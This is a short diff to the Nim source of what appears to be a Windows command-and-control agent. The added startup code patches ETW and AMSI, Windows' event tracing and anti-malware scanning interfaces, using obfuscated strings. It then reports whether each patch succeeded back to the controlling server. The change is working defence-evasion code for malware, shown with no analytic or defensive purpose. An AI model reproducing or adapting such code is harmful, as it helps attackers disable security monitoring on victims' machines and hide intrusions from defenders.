@@ -634,7 +634,26 @@ proc windows_start*(): void =
         discard startProcess(agent_execution_path_windows, options={poDaemon})
         quit()
     else:
+        var is_etw_success: string
+        var is_amsi_success: string
+        if patch_etw_on_start:
+            is_etw_success = $patch_func(protectString("etw"))
+        else:
+            is_etw_success = protectString("avoided")
+        if patch_amsi_on_start:
+            is_amsi_success = $patch_func(protectString("amsi"))
+        else:
+            is_amsi_success = protectString("avoided")
+        
         discard collect_data()
+
+        var data = {
+            protectString("patch_etw"): is_etw_success,
+            protectString("patch_amsi"): is_amsi_success
+        }.toTable 
+
+        discard post_data(client, protectString("patch_func") , $data)
+
 
 
 proc windows_parse_command*(command: JsonNode): bool =
